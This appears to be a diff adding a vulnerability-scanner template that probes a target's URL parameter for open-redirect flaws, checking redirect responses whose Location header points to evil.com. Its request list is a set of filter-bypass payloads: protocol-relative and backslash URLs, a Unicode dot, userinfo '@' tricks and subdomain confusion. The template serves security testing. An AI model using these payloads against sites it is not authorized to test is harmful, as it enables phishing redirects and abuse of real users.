@@ -1,0 +1,36 @@
+id: m7-redirect-bypass
+info:
+  name: M7 - Open Redirect Bypass Techniques
+  author: Sharlix
+  severity: medium
+  description: Advanced bypass for open redirect filters
+  tags: redirect,bypass,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=//evil.com"
+      - "{{BaseURL}}?url=/\evil.com"
+      - "{{BaseURL}}?url=https:evil.com"
+      - "{{BaseURL}}?url=/%09/evil.com"
+      - "{{BaseURL}}?url=https://evil%E3%80%82com"
+      - "{{BaseURL}}?url=https://evil。com"
+      - "{{BaseURL}}?url=\\evil.com"
+      - "{{BaseURL}}?url=https://evil.com%23"
+      - "{{BaseURL}}?url=https://legitimate.com@evil.com"
+      - "{{BaseURL}}?url=https://evil.com?.legitimate.com"
+      - "{{BaseURL}}?url=https://legitimate.com.evil.com"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "Location:.*evil\.com"
+        part: header
+
+      - type: status
+        status:
+          - 301
+          - 302
+          - 307
+          - 308
